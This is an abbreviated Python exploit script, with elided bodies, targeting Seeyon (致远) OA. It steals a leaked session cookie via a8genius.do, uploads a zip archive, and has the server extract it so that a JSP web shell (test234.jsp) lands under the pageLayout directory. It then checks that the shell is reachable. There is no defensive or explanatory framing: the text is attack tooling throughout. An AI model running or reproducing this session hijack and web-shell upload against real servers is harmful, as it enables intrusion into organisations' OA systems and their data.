...
def fileUpload(target_url, cookie):
    ...
    try:
        ...
        if len(firename) == 0:
            console.print(now_time() + ' [WARNING]  zip文件上传失败', style='bold yellow')
        else:
...
def unzip(header, target_url, firename):
    ...
    try:
        ...
        if r.status_code == 500:
            shell_url = target_url + 'seeyon/common/designer/pageLayout/test234.jsp'
            if requests.get(shell_url, timeout=3, verify=False).status_code == 200:
                ...
                console.print(now_time() + ' [WARNING]  致远OA Session泄露 任意文件上传漏洞利用失败', style='bold yellow')
        else:
            print(sys.exc_info())
            console.print(now_time() + ' [WARNING]  zip文件解压失败', style='bold yellow')
    except:
        print(sys.exc_info())
        console.print(now_time() + ' [WARNING]  zip文件解压失败', style='bold yellow')
...
def main(target_url):
    ...
    try:
        ...
        if r.status_code == 200 and "a8genius.do" in r.text and 'set-cookie' in str(r.headers).lower():
            ...
            console.print(now_time() + ' [INFO]     成功获取到Session: {}'.format(cookie), style='bold blue')
            fileUpload(target_url, cookie)
        else:
            console.print(now_time() + ' [WARNING]  获取Session失败', style='bold yellow')
    except:
        print(sys.exc_info())
        console.print(now_time() + ' [WARNING]  请求失败', style='bold yellow')
